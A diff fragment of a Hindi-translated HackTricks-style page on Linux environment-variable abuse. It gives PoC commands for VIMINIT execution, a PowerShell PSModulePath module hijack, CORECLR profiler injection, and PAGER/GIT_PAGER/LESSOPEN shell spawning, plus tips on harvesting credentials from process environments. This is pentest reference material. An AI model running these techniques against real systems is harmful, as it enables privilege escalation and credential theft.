-Vim/Neovim सामान्य startup के दौरान `VIMINIT` (या उसके `EXINIT` fallback) में मौजूद Ex commands को execute करते हैं। Ex commands में `:!cmd` और `:call system(...)` शामिल हैं, इसलिए यह variable नियंत्रित करने पर जब भी victim Vim खोलता है, code execution हो जाता है (`root sudo vim`, `crontab -e`, `visudo`, `$EDITOR` को spawn करने वाला `git`/`less`, आदि)।<sup>[[9]](#references)</sup>
+Vim/Neovim सामान्य startup के दौरान `VIMINIT` (या उसके fallback `EXINIT`) में मौजूद Ex commands चलाते हैं। Ex commands में `:!cmd` और `:call system(...)` शामिल हैं, इसलिए इस variable को नियंत्रित करने से जब भी कोई victim Vim खोलता है (जैसे root का `sudo vim`, `crontab -e`, `visudo`, या `$EDITOR` शुरू करने वाला `git`/`less`), code execution मिल जाता है।<sup>[[9]](#references)</sup>
+
 ```bash
 echo hi > /tmp/victim.txt
 printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
 test -e /tmp/vim-executed && echo 'VIMINIT executed'
 ```
-Batch mode (`vim -es`/`-Es`) इन variables को skip करता है, लेकिन सामान्य interactive startup इन्हें चलाता है।
+
+Batch mode (`vim -es`/`-Es`) इन variables को छोड़ देता है, लेकिन सामान्य interactive startup में ये चलती हैं।
 
 ### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS और CLR profiler**
 
-PowerShell Core (`pwsh`) Linux/macOS (और Windows) पर चलता है और एक **.NET application** है, इसलिए कई environment variables inherited environment के साथ किए गए किसी भी `pwsh` invocation को code execution में बदल सकते हैं — यह cron/systemd jobs, CI runners और ऐसे privileged wrappers के विरुद्ध उपयोगी है जो `pwsh` को shell out करते हैं।
+PowerShell Core (`pwsh`) Linux/macOS (और Windows) पर चलता है और एक **.NET application** है, इसलिए कई environment variables ऐसे inherited environment के साथ किसी भी `pwsh` invocation को code execution में बदल सकते हैं — यह cron/systemd jobs, CI runners और उन privileged wrappers के विरुद्ध उपयोगी है जो `pwsh` को shell out करते हैं।
 
-- `PSModulePath`: PowerShell इस list में मौजूद प्रत्येक directory को `.psd1`/`.psm1` modules के लिए recursively search करता है और पहली बार उसके द्वारा export किए गए किसी command का reference मिलने पर एक module को **auto-load** करता है। किसी directory को prepend करने पर आपके module का top-level code import के समय चलता है; क्योंकि resolution *Alias → Function → Cmdlet* क्रम में होता है, इसलिए कोई exported function victim द्वारा call किए जाने वाले built-in cmdlet को भी shadow कर सकता है।<sup>[[10]](#references)</sup>
-- `XDG_CONFIG_HOME`: `powershell/Microsoft.PowerShell_profile.ps1` का स्थान बदलता है, जिसे startup पर execute किया जाता है (`-NoProfile` होने पर नहीं)।
-- `DOTNET_STARTUP_HOOKS`: managed assembly, जिसका `StartupHook.Initialize()` `Main` से पहले चलता है (हर .NET app द्वारा shared)।
-- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API startup पर process में attacker library load करती है (path vars registry पर प्राथमिकता रखते हैं; `DOTNET_*` नया alias है)। Windows PowerShell 5.1 (.NET Framework) में `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` का उपयोग करें। MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
+- `PSModulePath`: PowerShell इस सूची की हर directory में `.psd1`/`.psm1` modules को recursively खोजता है और किसी command द्वारा export किए गए command का पहली बार reference होने पर उसे **auto-load** करता है। कोई directory prepend करें और आपके module का top-level code import के समय चलता है; क्योंकि resolution *Alias → Function → Cmdlet* क्रम में होता है, export किया गया function victim द्वारा इस्तेमाल किए जाने वाले built-in cmdlet को भी shadow कर सकता है।<sup>[[10]](#references)</sup>
+- `XDG_CONFIG_HOME`: `powershell/Microsoft.PowerShell_profile.ps1` का स्थान बदलता है, जो startup पर execute होती है (`-NoProfile` के बिना)।
+- `DOTNET_STARTUP_HOOKS`: managed assembly, जिसका `StartupHook.Initialize()` `Main` से पहले चलता है (सभी .NET apps में साझा)।
+- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API startup पर process में attacker library लोड करती है (path vars, registry से अधिक प्राथमिकता रखते हैं; `DOTNET_*` नया alias है)। Windows PowerShell 5.1 (.NET Framework) पर `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` इस्तेमाल करें। MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
+
 ```bash
 # PSModulePath module auto-load hijack
 mkdir -p /tmp/evil/Hijack
@@ -306,7 +361,8 @@ printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invo
 PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
 test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
 ```
-Windows पर, `PSExecutionPolicyPreference=Bypass` अतिरिक्त रूप से "unsigned scripts blocked" guardrail को हटा देता है, इसलिए planted profile/module वास्तव में run होता है। पूरे PoCs के लिए dedicated page देखें:
+
+Windows पर, `PSExecutionPolicyPreference=Bypass` “unsigned scripts blocked” सुरक्षा-रोक को भी हटा देता है, जिससे लगाया गया profile/module वास्तव में चलता है। पूरे PoCs के लिए समर्पित पेज देखें:
 
 {{#ref}}
 ../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
@@ -314,11 +370,12 @@ Windows पर, `PSExecutionPolicyPreference=Bypass` अतिरिक्त �
 
 ### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**
 
-कुछ tools environment से केवल path नहीं पढ़ते; वे इस value को **shell**, **editor**, या **input preprocessor** को pass करते हैं। इससे निम्न variables विशेष रूप से interesting हो जाते हैं, जब कोई privileged wrapper `git`, `man`, `less`, या इसी तरह के text viewers को run करता है:
+कुछ tools केवल environment से path नहीं पढ़ते; वे value को **shell**, **editor** या **input preprocessor** को देते हैं। इसलिए जब कोई privileged wrapper `git`, `man`, `less` या इसी तरह के text viewers चलाता है, तो ये variables खास तौर पर ध्यान देने योग्य होते हैं:
 
 - `PAGER`, `MANPAGER`, `GIT_PAGER`: pager command चुनते हैं।
 - `GIT_EDITOR`, `VISUAL`, `EDITOR`: editor command चुनते हैं, अक्सर arguments के साथ।
-- `LESSOPEN`, `LESSCLOSE`: ऐसे pre/post-processors define करते हैं जो `less` द्वारा file खोलने पर run होते हैं।
+- `LESSOPEN`, `LESSCLOSE`: ऐसे pre/post-processors तय करते हैं जो `less` द्वारा कोई file खोलने पर चलते हैं।
+
 ```bash
 PAGER='sh -c "exec sh 0<&1 1>&1"' man man
 
@@ -330,14 +387,17 @@ EOF
 chmod +x /tmp/lesspipe.sh
 LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
 ```
-Git **env-only config injection** को भी support करता है, जिसे `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, और `GIT_CONFIG_VALUE_<n>` के माध्यम से disk को छुए बिना किया जा सकता है:
+
+Git `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, और `GIT_CONFIG_VALUE_<n>` के ज़रिए disk को छुए बिना **केवल environment में config injection** का भी समर्थन करता है:
+
 ```bash
 GIT_CONFIG_COUNT=1 \
 GIT_CONFIG_KEY_0=core.pager \
 GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
 git -p help
 ```
-Post-exploitation के दृष्टिकोण से यह भी याद रखें कि inherited environments में अक्सर **credentials**, **proxy settings**, **service tokens**, या **cloud keys** होते हैं। `/proc/<PID>/environ` और `systemd` `Environment=` hunting के लिए [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) देखें।
+
+post-exploitation के नज़रिए से यह भी याद रखें कि inherited environments में अक्सर **credentials**, **proxy settings**, **service tokens**, या **cloud keys** होते हैं। `/proc/<PID>/environ` और `systemd` `Environment=` की जाँच के लिए [Linux Post Exploitation](../post-exploitation/README.md) देखें।
 
 ### PS1
 
@@ -349,7 +409,7 @@ Root:
 
 ![PERL5OPT & PERL5LIB - PS1: यह एक उदाहरण है](<../images/image (897).png>)
 
-Regular user:
+सामान्य user:
 
 ![PERL5OPT & PERL5LIB - PS1: एक, दो और तीन backgrounded jobs](<../images/image (740).png>)
 
@@ -357,21 +417,21 @@ Regular user:
 
 ![PERL5OPT & PERL5LIB - PS1: एक, दो और तीन backgrounded jobs](<../images/image (145).png>)
 
-एक background job, एक stopped और last command सही ढंग से पूरा नहीं हुआ:
+एक background job, एक stopped job और पिछली command सही ढंग से पूरी नहीं हुई:
 
-![PERL5OPT & PERL5LIB - PS1: एक background job, एक stopped और last command सही ढंग से पूरा नहीं हुआ](<../images/image (715).png>)
+![PERL5OPT & PERL5LIB - PS1: एक background job, एक stopped job और पिछली command सही ढंग से पूरी नहीं हुई](<../images/image (715).png>)
 
 ## References
 
 - [1] [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
-- [2] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [2] [ld.so(8) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/ld.so.8.html)
 - [3] [Qualys - needrestart में LPEs](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
-- [4] [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
-- [5] [Common environment variables - Geek University](https://geek-university.com/linux/common-environment-variables/)
+- [4] [Node.js CLI दस्तावेज़ - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
+- [5] [सामान्य environment variables - Geek University](https://geek-university.com/linux/common-environment-variables/)
 - [6] [CVE-2023-4911: Looney Tunables - glibc के ld.so में Local Privilege Escalation - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
-- [7] [GNU Bash Manual - Bash Variables (`PS4`) & The Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
+- [7] [GNU Bash Manual - Bash Variables (`PS4`) और The Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
 - [8] [PEP 553 - Built-in breakpoint() और PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
-- [9] [Vim documentation - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
-- [10] [about_PSModulePath & PowerShell module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
-- [11] [.NET debugging & profiling config settings (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
+- [9] [Vim दस्तावेज़ - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
+- [10] [about_PSModulePath और PowerShell module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
+- [11] [.NET debugging और profiling config settings (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
 {{#include ../../banners/hacktricks-training.md}}
